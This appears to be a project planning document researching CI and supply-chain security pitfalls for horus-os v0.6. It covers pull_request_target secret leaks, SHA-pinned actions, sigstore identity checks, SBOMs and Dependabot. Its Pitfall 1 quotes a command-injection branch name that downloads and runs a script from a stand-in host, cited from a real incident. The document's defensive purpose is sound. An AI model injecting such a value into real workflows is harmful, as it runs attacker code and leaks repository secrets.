# Pitfalls Research

**Domain:** Adding contribution-gate readiness infrastructure to horus-os v0.6 — sigstore-based signing of wheel/sdist/tag/Release, SBOM generation at release time, pip-audit on every PR, Dependabot for runtime and dev deps, fork-PR CI hardening (secrets restricted, `safe-to-test` label gating, SHA-pinned actions), expanded CONTRIBUTING.md / PR template / issue templates / CODEOWNERS / triage doc, SECURITY.md disclosure flow tightening, and the gate flip from solo-mode to "contributions OPEN."
**Researched:** 2026-05-29
**Confidence:** HIGH on the failure modes (verified against published 2024-2026 PyPI / GitHub Actions incidents: Ultralytics 8.3.41-46 December 2024, tj-actions/changed-files March 2025, "testedbefore" March 2026 pull_request_target campaign, Wiz LiteLLM TeamPCP 2025; verified against sigstore-python verification semantics, PyPA pip-audit OSV-vs-PyPI behavior, PyPI PEP 740 attestation rollout, Dependabot grouping-vs-security-update semantics, the Drew DeVault / Jacob Tomlinson stale-bot critiques, and the Socket / OSI / Intel solo-maintainer burnout data). MEDIUM on "which fraction of first-week fork-PR contributors will trip Pitfall N vs Pitfall M" — those are guesses; the failure modes themselves are verified. LOW only on Pitfall 12's specific solo-maintainer SLO numbers (the "you will not hit 24h" claim is a judgement, but it is consistent with the published burnout data).

## Scope and Sibling Cross-References

This file ONLY covers v0.6 contribution-gate pitfalls. The v0.5 plugin-system pitfalls were captured in the prior version of this file (committed 2026-05-26, shipped 2026-05-27 with v0.5.0) and are out of scope here. Generic Python / FastAPI / SQLite pitfalls are also out of scope.

Where existing horus-os infrastructure already locks a position, this file builds on it instead of re-arguing:

- **`SECURITY.md` (current, lines 11-12)** still lists `0.3.x` as the supported branch. That is stale — v0.5.0 shipped 2026-05-27. Pitfall 11 makes "SECURITY.md is part of the release gate" the rule so this drift cannot recur after the v0.6 flip.
- **`STATUS.md` lines 14-26** is the canonical "solo mode" notice. Pitfall 10 makes it the gate-flip rollback target: if first-week PR volume overwhelms, flipping STATUS.md back to "solo mode" must be a single-commit operation, not a docs rewrite.
- **`SECURITY.md` lines 59-65** ("Contributor-pipeline security (not active yet)") names a "private pre-review process" — read alongside the user-memory rule that the private pipeline is named only in private repos, this file uses the placeholder phrase "private pre-review" and never the real name. Every public artifact this milestone produces must hold that line.
- **`scripts/release_gate.py`** (extended through v0.4 Phase 39 and v0.5 Phase 49) is the release-gate substrate. Pitfalls 4, 8, and 11 all extend it; the extension must follow the v0.5 ordering principle (gate first, then add behavior, never the reverse).
- **`tests/test_plugin_pitfalls/` directory (v0.5)** is the 1:1 pitfall→regression-test pattern. v0.6 must mirror it under `tests/test_contribution_gate_pitfalls/` so each pitfall below maps to exactly one test file. That is the downstream-consumer contract.
- **`.github/workflows/`** already runs the 3-OS × 2-Python matrix and install-smoke (per v0.5 Phase 49). v0.6 adds workflows, not OSes. Pitfall 8 mandates that any new check that depends on the network (vulnerability DB, sigstore Fulcio, OSV mirror) must have an offline / cached-result fallback so the matrix does not start failing because an external service had a bad hour.

Cited 2024-2026 incidents (URLs at the bottom): [Ultralytics 8.3.41-46 PyPI compromise, Dec 4-7 2024](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/) — `pull_request_target` + branch-name code injection + cached secrets; [tj-actions/changed-files compromise CVE-2025-30066, March 2025](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) — 350+ git tags retargeted to a malicious commit, ~23,000 affected repos; ["testedbefore" pull_request_target campaign, March 2026](https://github.com/orgs/community/discussions/179107) — 500+ malicious PRs across six accounts; [Wiz LiteLLM TeamPCP, 2025](https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign) — PyPI 1.82.7 / 1.82.8 trojanized; [Spotipy GHSA-h25v-8c87-rvm8](https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-h25v-8c87-rvm8) — pull_request_target secrets exfiltration in a small OSS Python project (directly comparable to horus-os size).

## Critical Pitfalls

### Pitfall 1: `pull_request_target` + checkout-PR-head leaks every secret to the first malicious fork PR

**What goes wrong:**
The first day v0.6 flips to "contributions OPEN" is the first day an attacker opens a PR from a throwaway fork. If any workflow uses `on: pull_request_target` and somewhere in that workflow's job checks out the PR head (`uses: actions/checkout@v4` with `ref: ${{ github.event.pull_request.head.sha }}`), the workflow runs *attacker-controlled code* with the *base repository's* secrets, the *base repository's* `GITHUB_TOKEN` (which by default has write permission on the contents of the repo), and from a runner that can reach internal package indexes. The attacker exfiltrates `secrets.ANTHROPIC_API_KEY`, `secrets.GEMINI_API_KEY`, `secrets.PYPI_API_TOKEN` (if we have one), and the Codecov / Sigstore OIDC tokens in 30 seconds via a one-line shell command appended to a test script. The fix-after-the-fact path is "rotate every secret, audit every workflow run since the flip, file disclosures with downstream users" — exactly what we are flipping the gate to AVOID.

This is not a theoretical attack:
- [Ultralytics 8.3.41 / 8.3.42 (Dec 4-7 2024)](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/) — pull_request_target ran a build step where the branch name `$(curl evil.example/x | sh)` was interpolated unquoted into a shell command; PyPI publishing token leaked; attacker pushed `8.3.41` to PyPI with a cryptominer; ~12 hours in the wild before takedown.
- [Spotipy (small Python OSS, ~5k stars, GHSA-h25v-8c87-rvm8)](https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-h25v-8c87-rvm8) — checkout PR head under pull_request_target, secrets exfiltrated. Same size profile as horus-os.
- ["testedbefore" campaign (March-April 2026)](https://github.com/orgs/community/discussions/179107) — six throwaway accounts, 500+ malicious PRs across small repos with the same checkout-head pattern.
- [Orca Security pull_request_nightmare research](https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/) — of 5,000 repos using `pull_request_target`, ~50 (1%) were exploitable; horus-os, with one maintainer reviewing workflows, is in the population at risk.

**Why it happens:**
Three converging traps:
1. `pull_request_target` is the "right answer" Stack Overflow gives when someone asks "how do I label fork PRs or comment on them with CI results" — both legitimate needs. The reviewer copy-pastes the YAML and does not realize `checkout` with `ref: pull_request.head.sha` flips it from "harmless write-comment workflow" to "RCE on the runner."
2. The default `actions/checkout@v4` behavior under `pull_request_target` is to check out the *base*, which is safe; the unsafe pattern is an *explicit* `ref: head.sha`. The unsafe pattern is what gets cargo-culted because the default behavior is "the PR's tests run against base code," which surprises authors who want "the PR's tests run against the PR code." They flip the ref and ship the CVE.
3. There is no GitHub-side warning. The workflow validates, runs, and only the careful auditor sees the problem. The first signal a maintainer gets is the secret-rotation email from PyPI.

**How to avoid:**
- **`pull_request_target` is forbidden by default.** A repo-level workflow lint (`.github/workflows/lint-workflows.yml` or a pre-commit hook running `actionlint`) refuses any workflow file containing `on: pull_request_target` unless it has a sibling comment `# SECURITY: this workflow has been audited for pull_request_target safety; see docs/CI-SECURITY.md#workflow-name`. The comment forces the author to write down WHY this workflow needs the privileged trigger; the comment text is grep-able in CI for a release-gate check.
- **`pull_request` is the default trigger for fork PRs.** It runs from the fork's code, has no secrets, has a read-only `GITHUB_TOKEN`. Everything that does not need secrets (lint, type-check, unit tests, install-smoke without PyPI publish) runs on `pull_request`. This is the [GitHub Security Lab recommended split](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).
- **The maintainer-label-gated fork-CI shape.** For checks that genuinely need secrets (none currently, but the design must accommodate future "this PR's docs build needs to publish to a preview environment" type cases): use the `workflow_run` event listening to the unprivileged `pull_request` workflow's completion, OR use a `pull_request_target` workflow that runs ONLY after a maintainer applies a `safe-to-test` label. The label gate is checked at job-start with `if: contains(github.event.pull_request.labels.*.name, 'safe-to-test')`, AND a second job removes the label automatically on every new push to the PR (so a maintainer's "safe-to-test" approval applies only to the SHA they reviewed, not to whatever the attacker force-pushes 30 seconds later). The label-stripping pattern is documented in [GitHub's safe-handling-of-untrusted-input guidance](https://securitylab.github.com/research/github-actions-untrusted-input/) and is the v0.6 contract.
- **No `pull_request.head.sha` checkout in any `pull_request_target` workflow, ever.** Lint rule: `grep -rE "pull_request_target" .github/workflows/ | xargs grep -L "labels.*safe-to-test"` returns non-empty → fail. Second lint rule: any workflow that contains BOTH `pull_request_target` AND `actions/checkout` with an explicit `ref:` must have the `safe-to-test` gate AND the label-stripping job. Both rules in `scripts/release_gate.py`.
- **Permissions default to `read-all` repo-wide.** `.github/workflows/` directory contains a top-level `permissions: read-all` per-workflow; jobs that need writes scope it back up explicitly (`permissions: { contents: write }` only for the publish job). The PyPI publish token is exchanged via **Trusted Publishing (PEP 807 / OIDC)** so there is no long-lived `PYPI_API_TOKEN` secret to leak in the first place.
- **No shell interpolation of `github.*` context values.** The Ultralytics attack worked because `${{ github.event.pull_request.head.ref }}` was interpolated into a `bash` step. Lint rule (the [actionlint](https://github.com/rhysd/actionlint) `shellcheck` integration catches this): any `${{ github.* }}` interpolation inside a `run:` step that is not a known-safe scalar (the PR number, the run ID) is flagged. The known-safe field is passed via an env var (`env: PR_REF: ${{ github.event.pull_request.head.ref }}` then `run: echo "$PR_REF"`) which prevents the shell injection.

**Warning signs:**
- A workflow YAML containing `pull_request_target` without the SECURITY comment. Pre-merge hook block.
- A workflow YAML containing `actions/checkout` with `ref:` pointing at any `pull_request.*` field. Pre-merge block.
- The repo has any long-lived secret named `*_API_TOKEN` or `*_PUBLISH_*` and the workflow that uses it is triggered by `pull_request_target`. Audit fail.
- A fork PR's CI run shows secrets being read from the environment in a job that ran on the PR head's code. Hard regression: every secret rotated, postmortem in `.planning/incidents/`.
- `permissions:` is missing or set to `write-all` on any workflow. Default-to-read failure.

**Phase to address:**
**Phase 51-52 (CI hardening substrate)** lands the workflow lint rules, the default-read permissions, the `pull_request` / `pull_request_target` split, and the `safe-to-test` label gate. **Phase 53 (PyPI Trusted Publishing OIDC setup)** removes the long-lived publish secret entirely. **Phase 58 (release-gate extension)** wires the workflow-lint check into `scripts/release_gate.py` so the line cannot regress after the flip. The split MUST land BEFORE the gate flip in Phase 60; flipping the gate first and hardening CI after is the trap that becomes the v0.6.1 emergency rotation.

---

### Pitfall 2: GitHub Actions pinned to a mutable tag is the same as not pinning at all

**What goes wrong:**
`uses: actions/checkout@v4` looks pinned but is not. `v4` is a *git tag*, and git tags are mutable. If `actions/checkout`'s maintainer account is compromised (the [tj-actions/changed-files CVE-2025-30066, March 2025](https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/) is the canonical example: 350+ tags rewritten across the action's history, every consumer impacted, ~23,000 repos exfiltrated CI secrets via base64-encoded payloads in workflow logs), the attacker pushes a malicious commit and force-updates every existing tag (`v4`, `v4.1.0`, `main`, etc.) to point at the new commit. Every workflow using `@v4` runs the malicious code on its next CI run. Workflows pinned to a full 40-character commit SHA (`uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`) are completely unaffected because the SHA is content-addressed.

The trap has a twin: pinning everything by SHA at v0.6 launch and then never updating, so by v0.7 the pinned `actions/setup-python@a1b2c3...` is two majors out of date, has its own CVE that landed in `v5.x`, and the maintainer is now running a vulnerable action because the pin is preserved at the wrong version.

**Why it happens:**
- Pinning by tag is what every tutorial shows. The official `actions/checkout` README itself shows `@v4` in the quickstart, and the SHA pin is buried in the "Security hardening" section.
- The fix (`pin-github-action` or `frizbee` or a Renovate config that updates SHA pins) is one of the things the solo maintainer never gets around to setting up because the immediate cost is non-zero and the deferred cost is invisible until the next supply-chain attack.
- Dependabot's `package-ecosystem: github-actions` updates DO understand SHA pins and DO open PRs to bump them with a comment showing the new tag — but only if you turn it on, and it produces noisy PRs (Pitfall 5).

**How to avoid:**
- **Every action `uses:` line in `.github/workflows/` is pinned to a 40-char SHA.** Lint rule in `scripts/release_gate.py`: `grep -E "uses: [^@]+@[^a-f0-9]{40}" .github/workflows/ && exit 1`. The build fails if any action is tag-pinned. (The lint allows `@local` for repo-local composite actions and `@main` only for actions inside the repo itself.)
- **Each SHA pin has a trailing comment with the human-readable tag** so a reviewer can tell whether `b4ffde6...` is `v4.1.7` (current) or `v4.0.0` (years old). Convention: `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.2.2`. The [frizbee](https://github.com/stacklok/frizbee) tool and [pin-github-action](https://github.com/mheap/pin-github-action) both generate this format.
- **Dependabot is configured for `package-ecosystem: github-actions`** with `interval: weekly` so SHA pins get refreshed automatically. The PR title format (`bump actions/checkout from b4ffde6 to a1b2c3d`) and the body (which includes the upstream release notes) gives the maintainer a 30-second review path: "is this an LTS bump or a major-shape change?"
- **A "pin freshness" check on the release gate.** `scripts/release_gate.py` runs `gh api repos/{owner}/{repo}/actions/runs` over the last 30 days; if any third-party action pin is older than 90 days AND has a newer release upstream, the gate warns (not blocks — blocking turns the gate into noise; warning surfaces the staleness without breaking releases). The warning shows up in the release notes the maintainer drafts, which is the right place for it.
- **Forbid `@main` and `@master` from third-party actions absolutely.** Lint: `grep -E "uses: [^/]+/[^@]+@(main|master)" .github/workflows/ && exit 1`. The only branch-pinning allowed is for actions defined in *this* repo (where the maintainer controls the branch).

**Warning signs:**
- A reviewer comment "we should pin to v4 for simplicity" — that is the regression. Reject with a link to the tj-actions writeup.
- An action pin SHA that has been unchanged for >90 days while the upstream has cut three releases — the pin is stale; either bump it or document why we are deliberately not on the latest.
- A new workflow file lands with `@v4`-style pins because the contributor copy-pasted from the action's README. PR review red flag; offer the SHA-pinned version in the comment.
- The release gate's "pin freshness" warning has been logged for three consecutive releases without action. The maintainer is silently accepting risk; that needs to become an explicit decision in the release notes.

**Phase to address:**
**Phase 51 (CI hardening substrate)** — the SHA-pinning lint, the tag-comment convention, the freshness check. Owner: CIHARD-01 (SHA pin lint), CIHARD-02 (freshness check in release-gate). The Dependabot config for github-actions ecosystem lives in **Phase 54 (Dependabot setup)**. The two must agree on the convention; if Phase 51's lint rejects the format Phase 54's Dependabot generates, the bumps cannot land.

---

### Pitfall 3: Sigstore OIDC token expires mid-build OR the signature is verified against the wrong identity claim

**What goes wrong:**
Three distinct failure shapes under one umbrella:

1. **OIDC token expiry mid-build.** Sigstore's keyless flow exchanges a short-lived GitHub Actions OIDC token for a short-lived Fulcio certificate (validity ~10 minutes). If the build between "token-issued" and "sign-step" exceeds the token's TTL — slow wheel build, flaky CI runner, retry-with-backoff on a flaky test that gates the sign step — the sign step fails with `error: identity token expired`. The maintainer's fix is "retry the workflow"; the underlying mistake is treating the sign step as "one step in a long build" rather than "the first thing after a fresh token mint."

2. **`sigstore` vs `sigstore-git` mix-up.** There are at least three distinct sigstore-related tools and each has a different verifier identity model:
   - `sigstore-python` (PyPI: `sigstore`) — signs files (wheels, sdists) producing `.sigstore` bundles. This is what we want for the artifacts.
   - `gitsign` — signs git commits/tags. Different signature format; verified differently; not what `pip install` checks.
   - `cosign` — signs container images and (recently) blobs. Different bundle format from `sigstore-python` for blobs, though convergence is in progress.
   - A maintainer who reads "use sigstore for signing" and reaches for `cosign sign-blob` produces a signature the downstream tooling (`pip install --require-hashes`, PEP 740 attestation verifier) does not understand. The signature exists; nothing verifies it.

3. **Wrong identity claim in the verification step.** sigstore-python verification takes `--cert-identity` (the SAN of the signer cert) and `--cert-oidc-issuer` (which OIDC provider issued the underlying token). For a GitHub Actions run from `Ridou/horus-os` triggered on a tag push from the `main` branch, the identity is `https://github.com/Ridou/horus-os/.github/workflows/release.yml@refs/tags/v0.6.0` and the issuer is `https://token.actions.githubusercontent.com`. If the verifier is given `--cert-identity 'https://github.com/Ridou/horus-os/*'` (wildcard — sigstore-python uses **exact match**, not regex; cosign supports `--certificate-identity-regexp`), the verification fails. If the verifier is given just the repo `--cert-identity 'https://github.com/Ridou/horus-os'`, verification fails (the identity is workflow-scoped, not repo-scoped). Worse: if the verifier is given a too-permissive identity like the OIDC issuer alone, ANY GitHub-signed sigstore signature passes — including a malicious actor's signature from THEIR repo using THEIR workflow. The verifier looks like it works; it is checking the wrong thing.

The blast radius of (3) is the worst: a downstream user installs the wheel, sees "signature verified," trusts the install, and the signature was authored by an attacker's workflow on the attacker's fork. PEP 740 / PyPI attestations close this for PyPI-hosted artifacts (PyPI binds the publisher identity to the project) but not for users who fetch the wheel from GitHub Releases and verify on their end.

**Why it happens:**
- The OIDC TTL is in the documentation but is easy to miss. The official sigstore-python quickstart shows sign-then-verify in one job, where the token is fresh.
- The three tools all live in the `sigstore` GitHub org and the docs cross-reference each other. A maintainer who learns "sigstore signs things" reasonably reaches for whichever sub-tool the search result links to first.
- `--cert-identity` is exact match in sigstore-python and regex-match (via `--certificate-identity-regexp`) in cosign. A maintainer who learns one tool's flag shape and reaches for the other gets the wrong semantics. The [sigstore-python verification docs](https://sigstore.github.io/sigstore-python/verify/) say this, but the warning is in prose, not in a CLI error.
- The "wildcard identity passes everything" mistake is a category of bug in every cryptographic identity-check API. It is the cert-pinning-with-an-empty-pin-list trap from TLS; the [sigstore-java GHSA-jp26-88mw-89qr](https://github.com/sigstore/sigstore-java/security/advisories/GHSA-jp26-88mw-89qr) is the JVM analogue.

**How to avoid:**
- **Sign the wheel and sdist immediately after build; never separate the two by a long step.** The `.github/workflows/release.yml` job ordering is:
  1. Build wheel + sdist (≤90s).
  2. **Mint OIDC token + sign** (≤30s with `gh-action-sigstore-python@<sha>` — single step, no intervening build/test/network calls).
  3. Verify the freshly-produced signature against the EXPECTED identity (cross-check that step 2 produced what we expect — see below).
  4. Publish to PyPI via Trusted Publishing (separate OIDC exchange; that token is also fresh).
  5. Publish to GitHub Releases with the wheel + sdist + `.sigstore` bundles attached.
- **Use `sigstore-python` (not `cosign`, not `gitsign`) for wheel/sdist signing.** Pinned in `requirements-ci.txt`. The action is `sigstore/gh-action-sigstore-python@<SHA>` (per Pitfall 2). Output: a `.sigstore` bundle (single file containing signature + cert + transparency-log inclusion proof) alongside each artifact. This is the format PEP 740 attestations consume and the format `pip install` verifies (when PEP 740 verification is enabled in `pip`, post-25.x).
- **Use `gitsign` ONLY for the git tag, not for the artifacts.** Tag signing and artifact signing are separate concerns. The tag signature is verified by `git verify-tag v0.6.0`; the artifact signature is verified by sigstore tooling. A future user who clones the repo and runs `git verify-tag` is checking the tag identity; the same user who does `pip install horus-os==0.6.0` is checking the artifact identity. Both must verify. The release gate (Pitfall 11) checks both.
- **Verification identity is workflow-scoped and pinned in the verification script.** The reference verifier shipped at `scripts/verify_release.py` (the user-facing "did this release come from us" check) uses the exact identity:
  ```python
  EXPECTED_IDENTITY = "https://github.com/Ridou/horus-os/.github/workflows/release.yml@refs/tags/{version}"
  EXPECTED_ISSUER = "https://token.actions.githubusercontent.com"
  ```
  No wildcards. No regex. The `{version}` is supplied as a CLI argument and must match the wheel's actual version. Test fixture: `tests/test_release_verification.py` builds a fixture wheel signed under a *different* identity (a fake GitHub repo path) and asserts the verifier REJECTS it. If the test green-lights the wrong identity, the verifier is the bug, not the wheel.
- **OIDC token TTL is treated as a CI step's deadline.** Step 2 (mint + sign) has `timeout-minutes: 5` so a hung sign step does not silently consume the 10-min token. A second test fixture in `tests/test_release_oidc_flow.py` mocks an expired token and asserts the sign step fails with `OIDCError: token expired` and a clear remediation message — never falls back to anonymous signing.
- **Detached signatures (the `.sig` file format) are NOT used.** Bundle-only. `.sigstore` bundles include the inclusion proof inline, which means verification can be offline once you have the bundle. Detached signatures require a separate round-trip to the transparency log to fetch the inclusion proof, which (a) requires network at verify time, (b) leaves a gap where an attacker can replay an unproof'd signature, (c) is the format that downstream `pip install` tooling does NOT understand. Bundle format is `.sigstore` per the [Sigstore Bundle spec](https://github.com/sigstore/protobuf-specs/blob/main/protos/sigstore_bundle.proto) and is what PEP 740 references.

**Warning signs:**
- The sign step is later than position 2 in the release workflow (e.g., it runs after a long test phase or after the docs build). Token-expiry risk.
- A verification script that uses `--cert-identity` with a `*` or a trailing slash — exact match means the slash matters.
- A verification step that does NOT also check `--cert-oidc-issuer`. The issuer is what binds "GitHub Actions signed this" vs "some other OIDC provider signed this." Missing-issuer = identity assertion is half-checked.
- A reference to `cosign sign-blob` for a wheel. Wrong tool.
- A `.sig` file in the release assets without an accompanying `.sigstore` bundle. The bundle is canonical; the `.sig` is the legacy detached format.
- `pip install horus-os` from PyPI does not surface "verified via PEP 740 attestation" in pip's verbose output. Means our PyPI Trusted Publishing setup did not publish the attestation alongside the wheel.

**Phase to address:**
**Phase 53 (signing substrate)** lands `sigstore/gh-action-sigstore-python` pinned by SHA, the release.yml job ordering (build → sign → verify → publish), the workflow-scoped identity constant, the `tests/test_release_verification.py` round-trip test, and the `tests/test_release_oidc_flow.py` expired-token negative test. **Phase 58 (release-gate extension)** wires "signed `.sigstore` bundle exists for every artifact" into `scripts/release_gate.py`. Owner: SIGN-01 (sigstore-python wheel/sdist signing), SIGN-02 (workflow-scoped identity), SIGN-03 (tag signing via gitsign or `git tag -s` — decide at requirements time). The identity-pinning decision must land before the signing step ships; flipping it later is a "previously-verifying users now see a verification failure" breaking change.

---

### Pitfall 4: SBOM lists install-time resolved deps, not declared-and-pinned deps — verification against the published wheel fails

**What goes wrong:**
The SBOM generated at release time is supposed to answer "exactly what does horus-os 0.6.0 contain?" The wrong way to answer that is to run `pip install horus-os` in some venv and serialize the resulting `pip freeze`. That venv was resolved at SBOM-build time against the PyPI index of THAT moment. If the SBOM-build venv resolved `httpx` to `0.27.2` because that was the latest at SBOM-build, but the wheel itself just declares `httpx>=0.27,<0.28`, the SBOM tells downstream tooling "this artifact contains httpx 0.27.2" — a claim about a specific transitive resolution that is FALSE for any user who installs after `httpx 0.27.3` ships. Downstream pip-audit on the published wheel will report different CVEs than the SBOM lists. SBOM-vs-reality drift is the most common SBOM bug, called out explicitly in [the arXiv survey of SBOM tools](https://arxiv.org/html/2409.01214v1) and [Anchore's pipdeptree-vs-Syft comparison](https://anchore.com/blog/python-sbom-generation/).

Two sister failure modes:

1. **SBOM lists only direct deps, missing the transitive tree.** `cyclonedx-py requirements -r requirements.txt` without `--from-installation` produces an SBOM listing only what `requirements.txt` names, not what those names pull in transitively. A downstream user scanning the SBOM for CVEs misses the entire transitive surface. The [SafeDep article on direct-vs-transitive SBOMs](https://safedep.io/sbom-direct-transitive-deps/) is the canonical writeup.
2. **SBOM generated in a dirty venv (with `[dev,otel]` extras installed) attached to a wheel built from a clean install.** The SBOM lists pytest, ruff, mypy, opentelemetry-sdk; the wheel actually contains none of those. Downstream tooling that maps SBOM→runtime sees "horus-os installs pytest in production." That is wrong AND scary.

Format-negotiation sister-trap: PyPI's PEP 740 attestation format references SBOMs in CycloneDX 1.6+ JSON. SPDX 2.3 JSON is the broader-supported format for compliance tooling (the federal SBOM mandate explicitly cites SPDX). A maintainer who generates a CycloneDX 1.3 XML SBOM (because that's what an old tutorial showed) attaches something the downstream pipeline neither accepts as a PEP 740 attestation NOR ingests cleanly as an SPDX-consumer. Two formats, both broken.

**Why it happens:**
- `pip freeze` is the obvious-feeling answer. It IS an inventory; it just inventories the wrong thing.
- The CycloneDX-vs-SPDX choice is presented in every tooling docs as "pick one" without making clear that "pick one that your DOWNSTREAM consumer accepts" is the actual decision. [HeroDevs's SPDX-vs-CycloneDX comparison](https://www.herodevs.com/blog-posts/spdx-vs-cyclonedx-choosing-the-right-sbom-format-for-your-software-supply-chain) makes this explicit; most docs do not.
- `cyclonedx-py` has TWO entry-point modes (`requirements`, `environment`, `poetry`, `pipenv`, `uv`) that produce different SBOMs from the same project. The default invocation in CI tutorials picks one without explaining which.

**How to avoid:**
- **The SBOM IS generated against the built wheel, not against an install.** Workflow step ordering:
  1. Build `dist/horus_os-0.6.0-py3-none-any.whl`.
  2. Run `cyclonedx-py environment --output-format json --output-file dist/horus_os-0.6.0.sbom.json` against a venv that has been freshly created and `pip install dist/horus_os-0.6.0-py3-none-any.whl` (NO dev extras, NO `[otel]`). The SBOM reflects exactly what a user gets from `pip install horus-os==0.6.0` on a fresh venv.
  3. A second SBOM for the `[dev,otel]` install is generated as `dist/horus_os-0.6.0-with-extras.sbom.json` — distinct file, distinct label. Both ship; downstream tooling picks the relevant one.
  4. Sign the SBOMs alongside the wheel/sdist (Pitfall 3); attach to PyPI as PEP 740 attestation; attach to GitHub Release as a separate asset.
- **Format choice is locked at requirements time: CycloneDX 1.6 JSON.** Per `PROJECT.md` line 43: "SBOM format: CycloneDX vs SPDX. Likely CycloneDX (Python tooling more mature). Lock at requirements time." This file ratifies the lock. Rationale: (a) PyPI PEP 740 attestation consumes CycloneDX, (b) `cyclonedx-py` is PyPA-adjacent and the most active Python SBOM toolchain, (c) JSON over XML for grep-ability and CI integration. SPDX is supported via post-generation conversion if a downstream consumer requires it (`syft convert` or `cyclonedx-cli convert`); the *primary* artifact is CycloneDX 1.6 JSON.
- **The SBOM is verified at release-gate time against the actual wheel's deps.** `scripts/release_gate.py` extends with a step: install the wheel into a fresh venv, run `pip list --format=json`, diff against the SBOM. Mismatch = block release. This catches the "dirty venv" case before publish.
- **Transitive coverage is asserted.** A negative test fixture: a project that depends on `httpx` (which transitively pulls `httpcore`, `anyio`, `sniffio`, `certifi`, `idna`, `h11`). The SBOM generated against it must contain all six. `tests/test_sbom_transitive.py` asserts the count and the specific package set; if `cyclonedx-py` regresses or the wrong subcommand is wired, the test turns red.
- **The SBOM matches the PUBLISHED wheel hash, not the local one.** After PyPI publish, the release gate re-downloads the published wheel and re-runs the diff; the SBOM and the wheel-on-PyPI must be the same artifact. This catches the "we built A, signed B, published C" class of bug.

**Warning signs:**
- The SBOM lists `pytest` or `ruff` or `opentelemetry-sdk` as a top-level component while claiming to describe the runtime wheel. Wrong venv.
- The SBOM is XML when downstream tooling expects JSON, or CycloneDX 1.3 when 1.6 is required. Format-version drift.
- The SBOM has no transitive deps listed, only direct. The "explode" step (per [SafeDep](https://safedep.io/sbom-direct-transitive-deps/)) was skipped.
- The release gate's "SBOM matches wheel" diff returns mismatches. Hard fail.
- A user reports "the SBOM says version X but pip installs version Y" — drift that should have been caught at gate time.

**Phase to address:**
**Phase 54 (supply-chain check substrate)** lands `cyclonedx-py` pinned, the two-SBOM convention (clean install vs `[dev,otel]`), the format-version lock at CycloneDX 1.6 JSON, the workflow step ordering. **Phase 58 (release-gate extension)** wires the SBOM-matches-wheel diff. Owner: SUPPLY-01 (cyclonedx-py setup), SUPPLY-02 (two-SBOM convention), SUPPLY-03 (transitive coverage test). The format lock must be in the requirements doc before the action ships, otherwise we ship CycloneDX-1.3 and find out at the first downstream-tooling integration that it's the wrong version.

---

### Pitfall 5: pip-audit false positives block legitimate releases; Dependabot CVE PRs get buried in a "weekly minor bump" group

**What goes wrong:**
Two interacting failure modes:

1. **pip-audit false positives block the release.** pip-audit consults the [PyPA Advisory Database](https://github.com/pypa/advisory-database) by default; with `-s osv` it consults the broader OSV database. The PyPA db is curated and conservative; OSV is broader and includes advisories that are flagged but not yet verified, AND includes vulnerabilities in code paths the project does not exercise. [pip-audit explicitly acknowledges this](https://github.com/pypa/pip-audit) and provides `--ignore-vuln` for known false positives; the most famous current example is GHSA-w596-4wvx-j9j6 (a vulnerability in `py` package via the `pytest` install path that is exposed only in code most projects do not call). If `pip-audit` blocks the release on a false positive and the maintainer cannot release the patched binary that actually fixes the previously-reported real CVE, the security-hardening tool has caused a security regression.

2. **Dependabot grouping hides a CVE fix inside a weekly minor bump.** The recommended Dependabot configuration uses `groups:` to batch routine updates so the maintainer is not drowned in PRs. The natural extension is to add `applies-to: security-updates` and group security PRs too. [GitHub's "Grouped Security PRs" public beta](https://github.com/orgs/community/discussions/78188) supports this. The trap: a CVE fix lands in `urllib3 2.2.3` and the weekly group PR titled "bump 14 dependencies" includes it as one bullet. The maintainer sees "weekly dep PR" and defers it. A week later the same maintainer is reading a CVE postmortem asking "did we patch?" — yes, the PR was open; no, it had not been merged because it looked like noise. This is the inverse of the Pitfall 1 risk: not a malicious change, but a real fix lost to triage fatigue.

A composite failure: pip-audit blocking on the false positive AND the actual fix being buried in a grouped PR. The maintainer cannot ship the release that includes the fix because pip-audit blocks on an unrelated false positive in a different package; the actual fix sits in a Dependabot grouped PR labeled "routine bumps."

**Why it happens:**
- pip-audit's default `--strict` posture is correct for "do I have known vulnerabilities" but wrong for "do I have known *exploitable* vulnerabilities." Without an `--ignore-vuln` discipline, the noise compounds.
- Dependabot grouping is presented as a noise-reduction win. It is, for routine bumps. It is anti-pattern for security fixes, which need individual visibility.
- The maintainer's mental model is "Dependabot PRs are routine; if it were urgent, GitHub would highlight it." GitHub does flag security alerts separately in the Security tab, but the PR list view treats them all the same.

**How to avoid:**
- **pip-audit runs on every PR (against base AND `[dev,otel]` extras), with an EXPLICIT ignore-list maintained in `.github/pip-audit-ignore.txt`.** Each ignore is one line with the format `GHSA-w596-4wvx-j9j6 # 2026-04-01 — py package via pytest install, code path unused, see issue #N`. The ignore comment is mandatory; a future maintainer reads the file and sees WHY this was ignored. CI lint: every line in the file must have a `#` comment with a date in the last 365 days (re-evaluate annually) and an issue link.
- **pip-audit failure modes are categorized:**
  - **Known false positive (in the ignore list):** silent skip.
  - **New vulnerability in a direct dep:** PR check fails; merge blocked; ignore-list update or dep upgrade required.
  - **New vulnerability in a transitive dep with no patched version available:** PR check fails; documented escape hatch: open a `.github/pip-audit-tracking/GHSA-XXXX.md` file explaining the exposure and the timeline for upstream fix; CI then allows the PR to merge with a warning. The tracking file prevents the "we just ignored it" path; the timeline forces accountability.
- **Dependabot config: security updates are NEVER grouped.** `dependabot.yml` has:
  ```yaml
  updates:
    - package-ecosystem: pip
      schedule: { interval: weekly }
      groups:
        runtime-deps:
          applies-to: version-updates
          dependency-type: production
          update-types: [minor, patch]
        dev-deps:
          applies-to: version-updates
          dependency-type: development
      # security updates explicitly NOT in any group; one PR per CVE
  ```
  Security PRs land individually, get the `security` label automatically, and bypass the weekly cadence — they come in within minutes of the advisory publishing. The "security-updates" grouped beta is explicitly NOT used in v0.6.
